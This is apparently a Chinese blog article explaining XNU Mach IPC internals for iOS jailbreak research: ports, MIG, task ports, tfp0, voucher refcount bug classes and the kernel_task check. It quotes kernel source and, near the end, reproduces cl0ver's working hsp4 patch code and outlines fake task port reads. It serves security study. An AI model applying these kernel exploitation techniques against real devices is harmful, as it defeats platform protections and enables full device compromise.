mach_port_name_t表示本地命名空间标识，但未关联任何端口权限，并且在任务命名空间之外基本上没有任何意义。 进程从内核处接收到mach_port_t，就会将关联的端口权限映射到接收者，mach_port_name_t则不会。 mach_port_t通常至少拥有一项权限，可以是RECEIVE、SEND或SEND_ONCE。 获得mach_port_t的句柄会自动在调用者的命名空间中创建关联的发送权限。 发送或接收消息，可以使用osfmk/mach/message.h中定义的mach_msg和mach_msg_overwrite API。 1234567kern_return_t kret;// Initialize a portmach_port_t port;// Allocate the port and get a receive rightkret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;port);if (kret != KERN_SUCCESS) T_FAIL(&quot;mach_port_allocate: %s (%d)&quot;, mach_error_string(kret), kret); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* * Routine: mach_msg_overwrite * Purpose: * Send and/or receive a message. If the message operation * is interrupted, and the user did not request an indication * of that fact, then restart the appropriate parts of the * operation silently (trap version does not restart). * * Distinct send and receive buffers may be specified. If * no separate receive buffer is specified, the msg parameter * will be used for both send and receive operations. * * In addition to a distinct receive buffer, that buffer may * already contain scatter control information to direct the * receiving of the message. */__WATCHOS_PROHIBITED __TVOS_PROHIBITEDextern mach_msg_return_t mach_msg_overwrite( mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify, mach_msg_header_t *rcv_msg, mach_msg_size_t rcv_limit);#ifndef KERNEL/* * Routine: mach_msg * Purpose: * Send and/or receive a message. If the message operation * is interrupted, and the user did not request an indication * of that fact, then restart the appropriate parts of the * operation silently (trap version does not restart). */__WATCHOS_PROHIBITED __TVOS_PROHIBITEDextern mach_msg_return_t mach_msg( mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify); 如果有一个端口的发送权限，可以使用mach_port_insert_right将这个发送权限插入另一个任务，然后使用mach_msg发送消息。如前所述，mach_port_name_t在任务命名空间之外毫无意义，这就是为什么需要将任务(ipc_space_t)与mach_port_name_t一起指定的原因，以便内核可以将指定的名称(mach_port_name_t)放入该任务的命名空间。 1234567891011121314151617181920212223242526272829303132333435363738394041/* * Routine: mach_port_insert_right [kernel call] * Purpose: * Inserts a right into a space, as if the space * voluntarily received the right in a message, * except that the right gets the specified name. * Conditions: * Nothing locked. * Returns: * KERN_SUCCESS Inserted the right. * KERN_INVALID_TASK The space is null. * KERN_INVALID_TASK The space is dead. * KERN_INVALID_VALUE The name isn't a legal name. * KERN_NAME_EXISTS The name already denotes a right. * KERN_INVALID_VALUE Message doesn't carry a port right. * KERN_INVALID_CAPABILITY Port is null or dead. * KERN_UREFS_OVERFLOW Urefs limit would be exceeded. * KERN_RIGHT_EXISTS Space has rights under another name. * KERN_RESOURCE_SHORTAGE Couldn't allocate memory. */kern_return_tmach_port_insert_right( ipc_space_t space, mach_port_name_t name, ipc_port_t poly, mach_msg_type_name_t polyPoly){ if (space == IS_NULL) return KERN_INVALID_TASK; if (!MACH_PORT_VALID(name) || !MACH_MSG_TYPE_PORT_ANY_RIGHT(polyPoly)) return KERN_INVALID_VALUE; if (!IO_VALID((ipc_object_t) poly)) return KERN_INVALID_CAPABILITY; return ipc_object_copyout_name(space, (ipc_object_t) poly, polyPoly, FALSE, name);} MIG-Mach接口生成器使用Mach API编写的许多代码都包含相同的样板代码，多次重复可能会导致复杂性，甚至导致安全漏洞，因此MIG非常方便。它基于MIG规范文件(defs)实现桩函数。客户端可以像调用任何其他C函数一样调用此桩函数，并且桩函数可以处理进出mach消息的数据的编组和解编组，从而控制发生在底层的所有Mach IPC实现。MIG规范文件具有扩展名defs，并且在编译内核时，这些文件由mig处理并生成额外的文件，这些文件包含自动生成的MIG封装器。 以osfmk/mach/task.defs中的task.defs文件为例，每个defs文件都有一个子系统名称，后跟一个任意数字，该数字在文件的开头声明。task.defs文件的子系统名称为task，数字为3400。桩函数还可以检查传递给它的参数的有效性。 1234567891011121314151617181920subsystem#if KERNEL_SERVER KernelServer#endif /* KERNEL_SERVER */ task 3400;#include &lt;mach/std_types.defs&gt;#include &lt;mach/mach_types.defs&gt;#include &lt;mach_debug/mach_debug_types.defs&gt;/* * Create a new task with an empty set of IPC rights, * and having an address space constructed from the * target task (or empty, if inherit_memory is FALSE). */routine task_create( target_task : task_t; ledgers : ledger_array_t; inherit_memory : boolean_t; out child_task : task_t); 如果要生成MIG封装器，则可以在包含def文件的目录运行mig。 在编译期间，mig工具根据子系统名称创建三个文件。例如对于task子系统，将创建以下文件： taskUser.c-该文件包含代理函数的实现，该代理函数负责将数据编组为消息并发送。它还负责解组返回的数据并将其发送回客户端 task.c-代理函数的原型 taskServer.c-桩函数的实现包含在此文件中 在生成的文件中定义了许多大部分是函数的routine。如routine task_set_exception_port： 12345678910111213141516171819202122232425/* Routine task_set_exception_ports */mig_internal novalue _Xtask_set_exception_ports (mach_msg_header_t *InHeadP, mach_msg_header_t *OutHeadP){#ifdef __MigPackStructs#pragma pack(push, 4)#endif typedef struct { mach_msg_header_t Head; /* start of the kernel processed data */ mach_msg_body_t msgh_body; mach_msg_port_descriptor_t new_port; /* end of the kernel processed data */ NDR_record_t NDR; exception_mask_t exception_mask; exception_behavior_t behavior; thread_state_flavor_t new_flavor; mach_msg_trailer_t trailer; } Request __attribute__((unused));#ifdef __MigPackStructs#pragma pack(pop)#endif typedef __Request__task_set_exception_ports_t __Request; typedef __Reply__task_set_exception_ports_t Reply __attribute__((unused)); 审计这些函数中的代码也非常重要。 任务端口Mach端口的另一个有用的功能是它们充当对象的抽象，而该抽象是由Mach消息提供的，这些消息主要通过MIG进行转换。例如，主机Mach端口提供许多API，以获取有关主机的信息。host_kernel_version()函数将打印内核版本。这与uname -r命令使用的API相同。查看osfmk/mach/mach_host.defs文件将显示主机端口API提供的所有routine。 1234567891011121314/* * Return information about this host. */routine host_info( host : host_t; flavor : host_flavor_t; out host_info_out : host_info_t, CountInOut);/* * Get string describing current kernel version. */routine host_kernel_version( host : host_t; out kernel_version : kernel_version_t); 类似，任务端口用作任务的抽象。可以在osfmk/mach/task.def或者BUILD文件夹中的osfmk/mach/task.defs找到这些API。 1234567891011121314151617181920212223242526272829/* * Read the selected state which is to be installed on new * threads in the task as they are created. */routine task_get_state( task : task_t; flavor : thread_state_flavor_t; out old_state : thread_state_t, CountInOut); /* * Set the selected state information to be installed on * all subsequently created threads in the task. */routine task_set_state( task : task_t; flavor : thread_state_flavor_t; new_state : thread_state_t);/* * Change the task's physical footprint limit (in MB). */routine task_set_phys_footprint_limit( task : task_t; new_limit : int; out old_limit : int);routine task_suspend2( target_task : task_t; out suspend_token : task_suspension_token_t); 这些API十分强大，可以与目标进程进行完全交互。具有进程的任务端口的发送权限将完全控制该任务，包括在目标任务内存区域中读取，写入和分配内存。这里提到的是进程(来自BSD)的任务(来自Mach)端口，需要注意的是，它们内部是有联系的。每个BSD进程都有一个对应的Mach任务，反之亦然。可以在osfmk/kern/task.h下找到task结构体，其中的bsd_info指向bsd/sys/proc_internal.h中的proc结构体。同样，proc结构体中的task是指向该进程的task结构体的指针。 使用Mach系统调用task_for_pid()，可以将与目标PID相对应的任务端口的发送权限发送给调用方。从bsd/vm/vm_unix.c中的以下注释可以看出，仅允许特权进程或具有相同用户ID的进程调用。除此之外，调用此API还需要某些权限get-task-allow和task_for_pid-allow。 1234567891011121314151617181920212223242526272829303132333435363738/* * Routine: task_for_pid * Purpose: * Get the task port for another &quot;process&quot;, named by its * process ID on the same host as &quot;target_task&quot;. * * Only permitted to privileged processes, or processes * with the same user ID. * * Note: if pid == 0, an error is return no matter who is calling. * * XXX This should be a BSD system call, not a Mach trap!!! */kern_return_ttask_for_pid( struct task_for_pid_args *args){ mach_port_name_t target_tport = args-&gt;target_tport; int pid = args-&gt;pid; user_addr_t task_addr = args-&gt;t; proc_t p = PROC_NULL; task_t t1 = TASK_NULL; task_t task = TASK_NULL; mach_port_name_t tret = MACH_PORT_NULL; ipc_port_t tfpport = MACH_PORT_NULL; void * sright; int error = 0; AUDIT_MACH_SYSCALL_ENTER(AUE_TASKFORPID); AUDIT_ARG(pid, pid); AUDIT_ARG(mach_port1, target_tport); /* Always check if pid == 0 */ if (pid == 0) { (void ) copyout((char *)&amp;t1, task_addr, sizeof(mach_port_name_t)); AUDIT_MACH_SYSCALL_EXIT(KERN_FAILURE); return(KERN_FAILURE); } 有一点是需要注意的，task_for_pid()始终会检查pid是否为0，以防止通过调用task_for_pid(0)获取到内核任务端口的发送权限，这个操作叫tfp0。在之前，一旦能够任意读写内核内存，越狱程序就会patch该检查并调用task_for_pid(0)。但是随着KPP和AMCC/KTRR的出现，不再能patch内核，因此使用了其它技术。tfp0这个叫法仍然存在，用于表示读写内核内存。 另一个非常常用的API是Mach系统调用pid_for_task()，用于查找与给定Mach任务相对应的进程的pid。它通常做的是查找task结构体，查找其中的bsd_info指向的内核中的proc结构体，并从proc结构体中读取p_pid。此技术已被广泛用于通过创建伪造的任务端口一次读取任意四个字节的内核内存（因为pid为32位）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* * pid_for_task * * Find the BSD process ID for the Mach task associated with the given Mach port * name * * Parameters: args User argument descriptor (see below) * * Indirect parameters: args-&gt;t Mach port name * args-&gt;pid Process ID (returned value; see below) * * Returns: KERL_SUCCESS Success * KERN_FAILURE Not success * * Implicit returns: args-&gt;pid Process ID * */kern_return_tpid_for_task( struct pid_for_task_args *args){ mach_port_name_t t = args-&gt;t; user_addr_t pid_addr = args-&gt;pid; proc_t p; task_t t1; int pid = -1; kern_return_t err = KERN_SUCCESS; AUDIT_MACH_SYSCALL_ENTER(AUE_PIDFORTASK); AUDIT_ARG(mach_port1, t); t1 = port_name_to_task_inspect(t); if (t1 == TASK_NULL) { err = KERN_FAILURE; goto pftout; } else { p = get_bsdtask_info(t1); if (p) { pid = proc_pid(p); err = KERN_SUCCESS; } else if (is_corpsetask(t1)) { pid = task_pid(t1); err = KERN_SUCCESS; }else { err = KERN_FAILURE; } } task_deallocate(t1);pftout: AUDIT_ARG(pid, pid); (void) copyout((char *) &amp;pid, pid_addr, sizeof(int)); AUDIT_MACH_SYSCALL_EXIT(err); return(err);} 内核任务端口内核被分配了PID 0，相应的无进程任务被称为内核任务。拥有内核任务的发送权限可以完全控制内核内存，对内核内存进行读写，还可以通过分配内存来注入任意代码（EXP执行原理）。如前所述，调用task_for_pid(0)的古老方法之一是patch对pid=0的检查。macOS上不安全内核(#if defined SECURE_KERNEL)也有一个processer_set_tasks() API会将内核任务端口作为第一个参数返回。获得内核任务端口后，以下五个MACH API经常用于与内存进行交互。需要注意的是，要成功执行此函数，调用者必须拥有目标任务的任务端口的发送权限。如果查看函数原型，则第一个参数是目标任务(vm_map_t target_task)。可以将内核任务端口(mach_port_t tfp0)作为第一个参数传递给它。具体的代码在libsyscall/mach/mach_vm.c中。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/*Allocate a region of virtual memory in the target task starting from user specified address*/kern_return_t mach_vm_allocate( vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);/*Deallocate a region of virtual memory in the target task starting from user specified address*/kern_return_t mach_vm_deallocate( vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);/*Read Kernel Memory in the target task at a specified address and transfers it to dynamically allocated memory in the callers address space*/kern_return_tmach_vm_read( vm_map_t map, mach_vm_address_t addr, mach_vm_size_t size, pointer_t *data, mach_msg_type_number_t *data_size) *data_size);/*Copy data from a caller-specified address to the given memory region in the target tasks address space*/kern_return_t mach_vm_write( vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);/*Sets the Protection attribute for a given memory range in the target tasks address space*/kern_return_t mach_vm_protect( vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, svm_prot_t new_protection); Mach凭证Mach凭证（osfmk/ipc/ipc_voucher.h）在内核中的表示为： 12345678910111213141516/* * IPC Voucher * * 凭证是对特定资源管理器属性值的引用计数的不可变（一旦创建）的索引集 * (which themselves are reference counted). */struct ipc_voucher { iv_index_t iv_hash; /* checksum hash */ iv_index_t iv_sum; /* checksum of values */ os_refcnt_t iv_refs; /* reference count */ iv_index_t iv_table_size; /* size of the voucher table */ iv_index_t iv_inline_table[IV_ENTRIES_INLINE]; iv_entry_t iv_table; /* table of voucher attr entries */ ipc_port_t iv_port; /* port representing the voucher */ queue_chain_t iv_hash_link; /* link on hash chain */}; IPC凭证代表一组任意属性，这些属性可以通过Mach消息中的发送权限在进程之间传递，与此相关的库是libdispatch。除iv_refs和iv_port外，其他的字段与管理凭证对象的全局列表和存储凭证所代表的属性有关。 voucher的iv_refs成员表示引用计数，从iOS12开始，iv_refs是32位的引用计数，值范围为1-0x0fffffff，超出此范围的引用计数将导致错误，这是一种新的防止整数溢出的缓解措施。 123#include &quot;refcnt.h&quot;#define OS_REFCNT_MAX_COUNT ((os_ref_count_t)0x0FFFFFFFUL) 如下所示，访问超出此范围的任何值都会触发内核panic。 1234567891011121314151617181920212223242526static voidos_ref_check_underflow(struct os_refcnt *rc, os_ref_count_t count){ if (__improbable(count == 0)) { panic(&quot;os_refcnt: underflow (rc=%p, grp=%s)\\n&quot;, rc, ref_grp_name(rc)); __builtin_unreachable(); }}static voidos_ref_assert_referenced(struct os_refcnt *rc, os_ref_count_t count){ if (__improbable(count == 0)) { panic(&quot;os_refcnt: used unsafely when zero (rc=%p, grp=%s)\\n&quot;, rc, ref_grp_name(rc)); __builtin_unreachable(); }}static voidos_ref_check_overflow(struct os_refcnt *rc, os_ref_count_t count){ if (__improbable(count &gt;= OS_REFCNT_MAX_COUNT)) { panic(&quot;os_refcnt: overflow (rc=%p, grp=%s)\\n&quot;, rc, ref_grp_name(rc)); __builtin_unreachable(); }} iv_port表示此用户空间的凭证。 通过调用host_create_mach_voucher()陷阱可以创建Mach凭证，返回代表凭证的端口，但是由于凭证是不可变的，当生成的凭证与已有的凭证完全相同时，就会返回现有凭证的引用，而不是创建一个新的凭证。 voucher的ipc_voucher_reference和ipc_voucher_release函数仅检查voucher是否不为NULL，然后调用iv_reference和iv_release，最后分别调用os_ref_retain和os_ref_release。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475voidipc_voucher_reference(ipc_voucher_t voucher){ if (IPC_VOUCHER_NULL == voucher) return; iv_reference(voucher);}voidipc_voucher_release(ipc_voucher_t voucher){ if (IPC_VOUCHER_NULL != voucher) iv_release(voucher);}static inline voidiv_reference(ipc_voucher_t iv){ os_ref_retain(&amp;iv-&gt;iv_refs);}static inline voidiv_release(ipc_voucher_t iv){ if (os_ref_release(&amp;iv-&gt;iv_refs) == 0) { iv_dealloc(iv, TRUE); }}voidos_ref_retain(struct os_refcnt *rc){ os_ref_count_t old = atomic_fetch_add_explicit(&amp;rc-&gt;ref_count, 1, memory_order_relaxed); os_ref_check_retain(rc, old);#if OS_REFCNT_DEBUG ref_retain_group(rc-&gt;ref_group); ref_log_op(rc-&gt;ref_group, (void *)rc, REFLOG_RETAIN);#endif}static inline os_ref_count_t OS_WARN_RESULTos_ref_release(struct os_refcnt *rc){ return os_ref_release_explicit(rc, memory_order_release, memory_order_acquire);}os_ref_count_tos_ref_release_explicit(struct os_refcnt *rc, memory_order release_order, memory_order dealloc_order){#if OS_REFCNT_DEBUG /* * Care not to use 'rc' after the decrement because it might be deallocated * under us. */ struct os_refgrp *grp = rc-&gt;ref_group; ref_log_op(grp, (void *)rc, REFLOG_RELEASE);#endif os_ref_count_t val = atomic_fetch_sub_explicit(&amp;rc-&gt;ref_count, 1, release_order); os_ref_check_underflow(rc, val); if (__improbable(--val == 0)) { atomic_load_explicit(&amp;rc-&gt;ref_count, dealloc_order);#if OS_REFCNT_DEBUG ref_log_drop(grp, (void *)rc); /* rc is only used as an identifier */#endif }#if OS_REFCNT_DEBUG ref_release_group(grp, !val);#endif return val;} BUILD/obj/EXPORT_HDRS/libkern/os/refcnt.h中可以看到更多信息： 1234567891011121314151617181920212223242526272829303132333435363738394041/* * os_ref_retain: acquire a reference (increment reference count by 1) atomically. * * os_ref_release: release a reference (decrement reference count) atomically and * return the new count. Memory is synchronized such that the dealloc block * (i.e. code handling the final release() == 0 call) sees up-to-date memory * with respect to all prior release()s on the same refcnt object. This * memory ordering is sufficient for most use cases. * * os_ref_release_relaxed: same as release() but with weaker relaxed memory ordering. * This can be used when the dealloc block is already synchronized with other * accesses to the object (for example, with a lock). * * os_ref_release_live: release a reference that is guaranteed not to be the last one. */void os_ref_retain(struct os_refcnt *);os_ref_count_t os_ref_release_explicit(struct os_refcnt *rc, memory_order release_order, memory_order dealloc_order) OS_WARN_RESULT;static inline os_ref_count_t OS_WARN_RESULTos_ref_release(struct os_refcnt *rc){ return os_ref_release_explicit(rc, memory_order_release, memory_order_acquire);}static inline os_ref_count_t OS_WARN_RESULTos_ref_release_relaxed(struct os_refcnt *rc){ return os_ref_release_explicit(rc, memory_order_relaxed, memory_order_relaxed);}static inline voidos_ref_release_live(struct os_refcnt *rc){ if (__improbable(os_ref_release_explicit(rc, memory_order_release, memory_order_relaxed) == 0)) { panic(&quot;os_refcnt: unexpected release of final reference (rc=%p)\\n&quot;, rc); __builtin_unreachable(); }} 因此，可能会出现两种漏洞： 以某种方式增加引用计数，从而导致溢出。如前所述，由于存在上限，这实际上是无法利用的。但是仍然可以将引用计数增加到0x0fffffff(7个f)。 将对象的引用计数设置为0，但是仍然有一个指向它的指针。由于引用计数变为0，对象将被释放，因此指向该对象的指针变成了悬空指针。 hsp4 PatchApple为防止越狱者获得内核任务而实施的另一项技术是对kernel_task的指针检查。即使获得了内核任务的句柄也无法使用Mach VM调用。检查在ipc_kobject_server()函数的ipc_kmsg_trace_send函数调用处开始，它会调用osfmk/kern/ipc_tt.c中的convert_port_to_task_with_exec_token函数，第31行： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/* * Routine: ipc_kobject_server * Purpose: * Handle a message sent to the kernel. * Generates a reply message. * Version for Untyped IPC. * Conditions: * Nothing locked. */ipc_kmsg_tipc_kobject_server( ipc_kmsg_t request, mach_msg_option_t __unused option){ ...... /* * Find the routine to call, and call it * to perform the kernel function */ ipc_kmsg_trace_send(request, option); { if (ptr) { /* * Check if the port is a task port, if its a task port then * snapshot the task exec token before the mig routine call. */ ipc_port_t port = request-&gt;ikm_header-&gt;msgh_remote_port; if (IP_VALID(port) &amp;&amp; ip_kotype(port) == IKOT_TASK) { task = convert_port_to_task_with_exec_token(port, &amp;exec_token); } (*ptr-&gt;routine)(request-&gt;ikm_header, reply-&gt;ikm_header); /* Check if the exec token changed during the mig routine */ if (task != TASK_NULL) { if (exec_token != task-&gt;exec_token) { exec_token_changed = TRUE; } task_deallocate(task); } kernel_task-&gt;messages_received++; } else { if (!ipc_kobject_notify(request-&gt;ikm_header, reply-&gt;ikm_header)){#if DEVELOPMENT || DEBUG printf(&quot;ipc_kobject_server: bogus kernel message, id=%d\\n&quot;, request-&gt;ikm_header-&gt;msgh_id);#endif /* DEVELOPMENT || DEBUG */ _MIG_MSGID_INVALID(request-&gt;ikm_header-&gt;msgh_id); ((mig_reply_error_t *) reply-&gt;ikm_header)-&gt;RetCode = MIG_BAD_ID; } else kernel_task-&gt;messages_received++; } kernel_task-&gt;messages_sent++; } convert_port_to_task_with_exec_token函数调用task_conversion_eval函数，第27行： 123456789101112131415161718192021222324252627282930313233343536373839404142/* * Routine: convert_port_to_task_with_exec_token * Purpose: * Convert from a port to a task and return * the exec token stored in the task. * Doesn't consume the port ref; produces a task ref, * which may be null. * Conditions: * Nothing locked. */task_tconvert_port_to_task_with_exec_token( ipc_port_t port, uint32_t *exec_token){ task_t task = TASK_NULL; if (IP_VALID(port)) { ip_lock(port); if ( ip_active(port) &amp;&amp; ip_kotype(port) == IKOT_TASK ) { task_t ct = current_task(); task = (task_t)port-&gt;ip_kobject; assert(task != TASK_NULL); if (task_conversion_eval(ct, task)) { ip_unlock(port); return TASK_NULL; } if (exec_token) { *exec_token = task-&gt;exec_token; } task_reference_internal(task); } ip_unlock(port); } return (task);} 检查就在task_conversion_eval()函数中，caller是想要操作任务端口的任务，victim是被操作的任务。首先检查caller是否为内核，如果是则返回成功。然后检查caller是否与victim相同，因为任务应该能够对其自身执行操作。第三次检查就是关键的地方了，如果想要操作kernel_task而自己不是kernel_task，则检查不会通过。不过这只是对kernel_task指针进行检查实现的。 12345678910111213141516171819202122232425262728293031323334353637383940414243kern_return_ttask_conversion_eval(task_t caller, task_t victim){ /* * Tasks are allowed to resolve their own task ports, and the kernel is * allowed to resolve anyone's task port. */ if (caller == kernel_task) { return KERN_SUCCESS; } if (caller == victim) { return KERN_SUCCESS; } /* * Only the kernel can can resolve the kernel's task port. We've established * by this point that the caller is not kernel_task. */ if (victim == TASK_NULL || victim == kernel_task) { return KERN_INVALID_SECURITY; }#if CONFIG_EMBEDDED /* * On embedded platforms, only a platform binary can resolve the task port * of another platform binary. */ if ((victim-&gt;t_flags &amp; TF_PLATFORM) &amp;&amp; !(caller-&gt;t_flags &amp; TF_PLATFORM)) {#if SECURE_KERNEL return KERN_INVALID_SECURITY;#else if (cs_relax_platform_task_ports) { return KERN_SUCCESS; } else { return KERN_INVALID_SECURITY; }#endif /* SECURE_KERNEL */ }#endif /* CONFIG_EMBEDDED */ return KERN_SUCCESS;} 因此尽管能够得到内核任务，但是仍将无法在其上调用Mach API，因为这里会返回KERN_INVALID_SECURITY，从而之前的函数将返回TASK_NULL。 在嵌入式平台上，代码会检查代码签名中的TF_PLATFORM标志，它是platform-application entitlement，这意味着没有此entitlement的caller无法对拥有这项entitlement的victim执行操作(只有Apple的文件才有这个entitlement)。 因此，较新的技术之一就是使用host_get_special_port()函数，来看看osfmk/mach/host_special_ports.h。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/* * Cannot be set or gotten from user space */#define HOST_SECURITY_PORT 0#define HOST_MIN_SPECIAL_PORT HOST_SECURITY_PORT/* * Always provided by kernel (cannot be set from user-space). */#define HOST_PORT 1#define HOST_PRIV_PORT 2#define HOST_IO_MASTER_PORT 3#define HOST_MAX_SPECIAL_KERNEL_PORT 7 /* room to grow */#define HOST_LAST_SPECIAL_KERNEL_PORT HOST_IO_MASTER_PORT/* * Not provided by kernel */#define HOST_DYNAMIC_PAGER_PORT (1 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_AUDIT_CONTROL_PORT (2 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_USER_NOTIFICATION_PORT (3 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_AUTOMOUNTD_PORT (4 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_LOCKD_PORT (5 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_KTRACE_BACKGROUND_PORT (6 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_SEATBELT_PORT (7 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_KEXTD_PORT (8 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_LAUNCHCTL_PORT (9 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_UNFREED_PORT (10 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_AMFID_PORT (11 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_GSSD_PORT (12 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_TELEMETRY_PORT (13 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_ATM_NOTIFICATION_PORT (14 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_COALITION_PORT (15 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_SYSDIAGNOSE_PORT (16 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_XPC_EXCEPTION_PORT (17 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_CONTAINERD_PORT (18 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_NODE_PORT (19 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_RESOURCE_NOTIFY_PORT (20 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_CLOSURED_PORT (21 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_SYSPOLICYD_PORT (22 + HOST_MAX_SPECIAL_KERNEL_PORT)#define HOST_MAX_SPECIAL_PORT HOST_SYSPOLICYD_PORT /* MAX = last since rdar://35861175 *//* obsolete name */#define HOST_CHUD_PORT HOST_LAUNCHCTL_PORT 从注释中可以看出前七个端口是为内核本身保留的。但是到目前为止，仅使用了其中的三个。HOST_PORT提供了主机的抽象，HOST_PRIV用于特权操作，而HOST_IO_MASTER_PORT用于与设备进行交互。每个特殊端口都有特定的编号，这非常重要。我们可以注意到没有使用编号4。 此外，为了获得发送到主机特殊端口的权限需要使用一个int参数调用host_get_special_port，该参数是分配给该特殊端口的编号。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* * User interface for setting a special port. * * Only permits the user to set a user-owned special port * ID, rejecting a kernel-owned special port ID. * * A special kernel port cannot be set up using this * routine; use kernel_set_special_port() instead. */kern_return_thost_set_special_port(host_priv_t host_priv, int id, ipc_port_t port){ if (host_priv == HOST_PRIV_NULL || id &lt;= HOST_MAX_SPECIAL_KERNEL_PORT || id &gt; HOST_MAX_SPECIAL_PORT) return (KERN_INVALID_ARGUMENT);#if CONFIG_MACF if (mac_task_check_set_host_special_port(current_task(), id, port) != 0) return (KERN_NO_ACCESS);#endif return (kernel_set_special_port(host_priv, id, port));}/* * User interface for retrieving a special port. * * Note that there is nothing to prevent a user special * port from disappearing after it has been discovered by * the caller; thus, using a special port can always result * in a &quot;port not valid&quot; error. */kern_return_thost_get_special_port(host_priv_t host_priv, __unused int node, int id, ipc_port_t * portp){ ipc_port_t port; if (host_priv == HOST_PRIV_NULL || id == HOST_SECURITY_PORT || id &gt; HOST_MAX_SPECIAL_PORT || id &lt; HOST_MIN_SPECIAL_PORT) return (KERN_INVALID_ARGUMENT); host_lock(host_priv); port = realhost.special[id]; *portp = ipc_port_copy_send(port); host_unlock(host_priv); return (KERN_SUCCESS);} 查看该函数，我们可以看到它需要host_priv端口作为参数，因此除了满足所有沙盒检查之外，执行此调用还需要root权限。host_get_special_port函数从realhost.special[id]得到端口值并返回给调用者。回到指针检查，如果我们可以重新映射内核任务，将其写入未使用的端口空间，即realhost.special[4]，然后调用host_get_special_port(4)，这应该就可以得到可用的内核任务。 该技术也称为hsp4 patch，广泛用于最近的一些越狱中，Siguza编写的cl0ver中的利用代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859bool patch_host_special_port_4(task_t kernel_task){ DEBUG(&quot;Installing host_special_port(4) patch...&quot;); addr_t *special = (addr_t*)offsets.slid.data_realhost_special; vm_address_t kernel_task_addr, kernel_self_port_addr, old_port_addr; vm_size_t size; kern_return_t ret; // Get address of kernel task size = sizeof(kernel_task_addr); ret = vm_read_overwrite(kernel_task, (vm_address_t)offsets.slid.data_kernel_task, sizeof(kernel_task_addr), (vm_address_t)&amp;kernel_task_addr, &amp;size); if(ret != KERN_SUCCESS) { THROW(&quot;Failed to get kernel task address: %s&quot;, mach_error_string(ret)); } DEBUG(&quot;Kernel task address: &quot; ADDR, (addr_t)kernel_task_addr); // Get address of kernel task/self port size = sizeof(kernel_self_port_addr); ret = vm_read_overwrite(kernel_task, kernel_task_addr + offsets.unslid.off_task_itk_self, sizeof(kernel_self_port_addr), (vm_address_t)&amp;kernel_self_port_addr, &amp;size); if(ret != KERN_SUCCESS) { THROW(&quot;Failed to get kernel task port address: %s&quot;, mach_error_string(ret)); } DEBUG(&quot;Kernel task port address: &quot; ADDR, (addr_t)kernel_self_port_addr); // Check if realhost.special[4] is set already size = sizeof(old_port_addr); ret = vm_read_overwrite(kernel_task, (vm_address_t)(&amp;special[4]), sizeof(old_port_addr), (vm_address_t)&amp;old_port_addr, &amp;size); if(ret != KERN_SUCCESS) { THROW(&quot;Failed to read realhost.special[4]: %s&quot;, mach_error_string(ret)); } if(old_port_addr != 0) { if(old_port_addr == kernel_self_port_addr) { DEBUG(&quot;Patch already in place, nothing to do&quot;); return false; } else { THROW(&quot;realhost.special[4] has a valid port already&quot;); } } // Write to realhost.special[4] ret = vm_write(kernel_task, (vm_address_t)(&amp;special[4]), (vm_address_t)&amp;kernel_self_port_addr, sizeof(kernel_self_port_addr)); if(ret != KERN_SUCCESS) { THROW(&quot;Failed to patch realhost.special[4]: %s&quot;, mach_error_string(ret)); } DEBUG(&quot;Successfully installed patch&quot;); return true;} 伪造任务端口最近常见的越狱技术之一是使用伪造的端口。内核以为是端口，但是实际是用户控制的内存空间。然后使用某些API可以从内核中提取数据。osfmk/ipc/ipc_port.h中定义的端口结构体： 1234567891011121314151617181920212223242526272829303132struct ipc_port { /* * Initial sub-structure in common with ipc_pset * First element is an ipc_object second is a * message queue */ struct ipc_object ip_object; struct ipc_mqueue ip_messages; union { struct ipc_space *receiver; struct ipc_port *destination; ipc_port_timestamp_t timestamp; } data; union { ipc_kobject_t kobject; ipc_importance_task_t imp_task; ipc_port_t sync_inheritor_port; struct knote *sync_inheritor_knote; struct turnstile *sync_inheritor_ts; } kdata; struct ipc_port *ip_nsrequest; struct ipc_port *ip_pdrequest; struct ipc_port_request *ip_requests; union { struct ipc_kmsg *premsg; struct turnstile *send_turnstile; SLIST_ENTRY(ipc_port) dealloc_elm; } kdata2; 